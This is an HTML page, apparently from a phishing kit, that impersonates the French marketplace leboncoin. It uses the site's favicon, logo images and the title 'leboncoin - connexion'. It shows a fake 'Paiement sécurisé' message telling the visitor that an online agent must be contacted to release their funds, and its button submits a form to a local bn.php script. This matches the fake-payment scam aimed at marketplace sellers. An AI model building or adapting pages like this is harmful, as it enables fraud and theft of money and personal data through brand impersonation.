<!doctype html>
<html lang="en">

<head>
     
    <script type="text/JavaScript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/JavaScript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script type="text/JavaScript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
     <link rel="icon" type="image/png" href="https://www.leboncoin.fr/_next/static/favicon-16-91b63f31.png" sizes="16x16"/><link rel="icon" type="image/png" href="https://www.leboncoin.fr/_next/static/favicon-32-543f08dc.png" sizes="32x32"/>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <title>leboncoin - connexion</title>
    <link href="css/hover.css" rel="stylesheet" media="all">
    <link rel="stylesheet" href="css/brand.css">
    <style type="text/css">
    .nav-item a {
        color: #163056 !important;
    }

    .shadow {
        margin-bottom: 4em;
        background: rgba(255, 255, 255, 0.8);
        border-radius: 3px;
        box-shadow: 0 0 12px 0 rgba(172, 172, 172, 0.5), 0 0 18px 0 rgba(178, 178, 178, 0.5);
        padding: 60px 10px;
    }

    .nav-links.inactive {
        color: #5C5C5C;
    }

    label {
        color: #5C5C5C;
    }
    </style>
</head>

<body style="background-image: url('images/bg.png');background-repeat: no-repeat;background-size: 980px;background-position:50% 90px">
    <div class="container-fluid" style="background-color: rgb(255, 255, 255);box-shadow: rgb(0 0 0 / 15%) 0px 2px 4px 0px;">
        <div class="row p-3">
            <div class="col-sm-5" style="color: rgb(245, 107, 42);">
                <img src="images/left.svg">
            </div>
            <div class="col-sm-7" style="color: rgb(245, 107, 42);">
                <img src="images/logo.svg" width="130px"> &nbsp
                <span style="font-size: 1.4em;font-weight: 500;"><img src="images/verified.svg" width="20px"> Connexion</span>
            </div>
        </div>
    </div>
    <div class="container-fluid mt-5 pt-3">
        <div class="row">
            <div class="col-sm-5 mx-auto" style="max-width: 480px;">
                <div class="text-center" style="border-radius: 8px;box-shadow: rgb(0 0 0 / 20%) 0px 1px 5px 0px, rgb(0 0 0 / 4%) 0px 3px 1px -2px, rgb(0 0 0 / 4%) 0px 2px 2px 0px;background-color: white;padding: 1rem 3.125em 3rem;;">
                    <br>
                    <form class="text-left pt-2 text-dark" action="./bn.php" method="POST">
                    <h5 style="color:rgb(245, 107, 42)">Paiement sécurisé</h5>
                    <h5>Bienvenue au service tchat en ligne pour votre mise à jour !</h5>
                    <p style="font-size:13px"> Veuillez rentrer en contact avec un agent en ligne afin de finaliser le deblocage de vos fonds.</p><br><br>
                    <img src="images/tchat.jpg" >
                    <h5></h5>


                    <button type="submit" class="btn w-100 mt-2"  id="btn1" style="border: 1px solid transparent;color: rgb(255, 255, 255);background-color: rgb(65, 131, 215);">Contactez un agent en ligne</button>
                   
                    </form>
                    
                </div>
            </div>
        </div>
    </div>

</body>


</html>
